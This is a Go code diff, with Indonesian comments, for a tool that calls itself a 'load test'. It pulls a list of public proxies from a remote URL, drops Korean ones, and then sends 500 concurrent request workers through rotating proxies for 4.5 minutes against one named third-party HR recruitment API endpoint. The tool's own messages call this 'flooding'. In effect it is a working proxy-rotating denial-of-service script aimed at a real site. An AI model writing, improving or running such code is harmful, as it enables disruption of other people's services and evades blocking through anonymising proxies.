@@ -5,16 +5,16 @@ import (
 	"fmt"
 	"net/http"
 	"net/url"
-	"os"
 	"sync"
 	"sync/atomic"
 	"time"
 )
 
 type ProxyItem struct {
-	IPAddress string   `json:"ip_address"`
-	Port      int      `json:"port"`
-	Protocols []string `json:"protocols"`
+	IPAddress   string   `json:"ip_address"`
+	Port        int      `json:"port"`
+	Protocols   []string `json:"protocols"`
+	CountryCode string   `json:"country_code"` // Ditambahkan untuk filter negara
 }
 
 type ProxyResponse struct {
@@ -34,40 +34,14 @@ var (
 
 func main() {
 	targetURL := "https://hris.quantumnusatama.id/api/rekrutmen/get-rekrutmen-data?id_rekrutmen=20653"
-	proxyFile := "proxies.json"
-
-	// Validasi awal file proxy
-	fmt.Println("[+] Memuat file proxies.json...")
-	fileData, err := os.ReadFile(proxyFile)
-	if err != nil {
-		fmt.Printf("Gagal membaca file %s: %v\n", proxyFile, err)
-		return
-	}
-
-	var proxyData ProxyResponse
-	if err := json.Unmarshal(fileData, &proxyData); err != nil {
-		fmt.Printf("Gagal parsing JSON: %v\n", err)
-		return
-	}
-
-	var candidateProxies []string
-	for _, p := range proxyData.Results {
-		for _, proto := range p.Protocols {
-			if proto == "HTTPS" || proto == "HTTP" || proto == "SOCKS5" {
-				proxyURL := fmt.Sprintf("http://%s:%d", p.IPAddress, p.Port)
-				candidateProxies = append(candidateProxies, proxyURL)
-				break
-			}
-		}
-	}
-	fmt.Printf("[*] Ditemukan %d kandidat proxy.\n", len(candidateProxies))
+	proxySourceURL := "https://micin-provider.pages.dev/proxy.json"
 
 	// Daftarkan Endpoint HTTP
 	http.HandleFunc("/run", func(w http.ResponseWriter, r *http.Request) {
-		// Cek apakah sedang berjalan (Atomic Check-And-Set)
+		// Proteksi Single Execution Lock (Hanya boleh 1x jalan bersamaan)
 		if !atomic.CompareAndSwapInt32(&isRunning, 0, 1) {
 			w.WriteHeader(http.StatusConflict)
-			w.Write([]byte("[-] Ditolak: Proses load test sedang berjalan! Harap tunggu hingga aktivitas flooding selesai."))
+			w.Write([]byte("[-] Ditolak: Proses load test sedang berjalan! Harap tunggu hingga aktivitas flooding selesai (4.5 menit)."))
 			return
 		}
 
@@ -76,15 +50,49 @@ func main() {
 		atomic.StoreInt64(&successCount, 0)
 		atomic.StoreInt64(&errorCount, 0)
 		startTime = time.Now()
-		statusMessage = "Load test sedang berjalan..."
+		statusMessage = "Mengunduh dan memfilter proxy dari URL..."
 
-		w.Write([]byte("[+] Load test berhasil dimulai untuk durasi 4.5 menit. Cek progress via /monitor"))
+		w.Write([]byte("[+] Load test berhasil dimulai. Mengambil daftar proxy terbaru... Cek progress via /monitor"))
 
-		// Jalankan load test di background goroutine agar HTTP handler tidak blocking
+		// Jalankan proses di background goroutine
 		go func() {
-			defer atomic.StoreInt32(&isRunning, 0) // Pastikan flag dilepas setelah selesai
+			defer atomic.StoreInt32(&isRunning, 0) // Pastikan flag dilepas saat selesai
 
-			// Health check ulang singkat untuk mendapatkan proxy aktif
+			// 1. Fetch data proxy langsung dari URL secara dinamis
+			clientHTTP := &http.Client{Timeout: 15 * time.Second}
+			respProxy, err := clientHTTP.Get(proxySourceURL)
+			if err != nil {
+				statusMessage = fmt.Sprintf("Gagal mendownload proxy: %v", err)
+				return
+			}
+			defer respProxy.Body.Close()
+
+			var proxyData ProxyResponse
+			if err := json.NewDecoder(respProxy.Body).Decode(&proxyData); err != nil {
+				statusMessage = fmt.Sprintf("Gagal parsing JSON proxy: %v", err)
+				return
+			}
+
+			// 2. Filter kandidat proxy (Kecualikan country_code == "KR")
+			var candidateProxies []string
+			for _, p := range proxyData.Results {
+				// Kecualikan jika CountryCode adalah "KR"
+				if p.CountryCode == "KR" {
+					continue
+				}
+
+				for _, proto := range p.Protocols {
+					if proto == "HTTPS" || proto == "HTTP" || proto == "SOCKS5" {
+						proxyURL := fmt.Sprintf("http://%s:%d", p.IPAddress, p.Port)
+						candidateProxies = append(candidateProxies, proxyURL)
+						break
+					}
+				}
+			}
+
+			statusMessage = fmt.Sprintf("Ditemukan %d kandidat proxy (Non-KR). Memulai health check...", len(candidateProxies))
+
+			// 3. Health check singkat proxy yang valid
 			var validProxies []string
 			var wgChk sync.WaitGroup
 			var muChk sync.Mutex
@@ -97,11 +105,11 @@ func main() {
 					if err != nil {
 						return
 					}
-					client := &http.Client{
+					chkClient := &http.Client{
 						Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
 						Timeout:   3 * time.Second,
 					}
-					resp, err := client.Get(targetURL)
+					resp, err := chkClient.Get(targetURL)
 					if err == nil {
 						defer resp.Body.Close()
 						if resp.StatusCode == http.StatusOK {
@@ -118,11 +126,12 @@ func main() {
 				validProxies = append(validProxies, "DIRECT")
 			}
 
-			// Konfigurasi Load Test
-			totalConcurrency := 500 // Diturunkan agar stabil di server/lokal (ubah sesuai kebutuhan)
+			statusMessage = fmt.Sprintf("Health check selesai. Proxy aktif: %d. Memulai load test...", len(validProxies))
+
+			// 4. Konfigurasi Load Test (Durasi 4.5 Menit)
+			totalConcurrency := 500
 			stopChan := make(chan struct{})
 
-			// Durasi diset 4.5 menit
 			time.AfterFunc(4*time.Minute+30*time.Second, func() {
 				close(stopChan)
 			})
@@ -146,8 +155,10 @@ func main() {
 					} else {
 						parsedProxy, _ := url.Parse(pStr)
 						client = &http.Client{
-							Transport: &http.Transport{Proxy: http.ProxyURL(parsedProxy)},
-							Timeout:   5 * time.Second,
+							Transport: &http.Transport{
+								Proxy: http.ProxyURL(parsedProxy),
+							},
+							Timeout: 5 * time.Second,
 						}
 					}
 
@@ -203,10 +214,9 @@ func main() {
 		json.NewEncoder(w).Encode(data)
 	})
 
-	fmt.Println("\n[+] Server berjalan di port :8080")
-	fmt.Println("[+] Endpoint tersedia:")
-	fmt.Println("    -> http://localhost:8080/run")
-	fmt.Println("    -> http://localhost:8080/monitor")
+	fmt.Println("\n[+] Server berjalan di port :8080 (Mengambil proxy online & filter KR)")
+	fmt.Println("    -> Endpoint: http://localhost:8080/run")
+	fmt.Println("    -> Endpoint: http://localhost:8080/monitor")
 
 	if err := http.ListenAndServe(":8080", nil); err != nil {
 		fmt.Printf("Server error: %v\n", err)
